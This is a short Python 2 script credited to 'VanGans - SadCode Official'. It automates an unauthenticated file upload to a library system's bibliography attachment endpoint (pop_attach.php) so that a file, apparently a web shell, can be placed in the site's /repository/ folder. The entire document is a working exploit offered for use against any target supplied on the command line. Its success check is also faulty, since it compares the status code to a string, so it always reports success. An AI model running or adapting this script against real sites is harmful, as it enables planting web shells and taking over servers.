#!/usr/bin/python
# Auto Exploit File Attachment Upload File Upload
# Coded By VanGans - SadCode Official

import sys, requests

print """
##############################################
# Auto Exploit File Attachment Upload File.  #
# Coded By VanGans - SadCode Official.       #
##############################################
"""

target=sys.argv[1]
vuln="/admin/modules/bibliography/pop_attach.php?biblioID=0"
file_shell=sys.argv[2]
pyld={
"fileTitle" : "exploit",
"fileDir" : "",
"fileURL" : "",
"fileDesc" : "",
"accessType" : "public",
"upload" : 'Unggah Sekarang'
}
file_raw=open(file_shell,'r')
file_x={ "file2attach" : file_raw }

print "[*] Exploiting : " + target
print "[*] Uploading : " + file_shell
exploit=requests.post(url=target + vuln, files=file_x, data=pyld)
cek=requests.get(url=target + "/repository/" + file_shell)

if not cek.status_code == "200" :
    print "[+] Url Your File : " + target + "/repository/" + file_shell
    print "[+] Exploit Status : Success"
else :
    print "[-] Exploit Status : Failed"
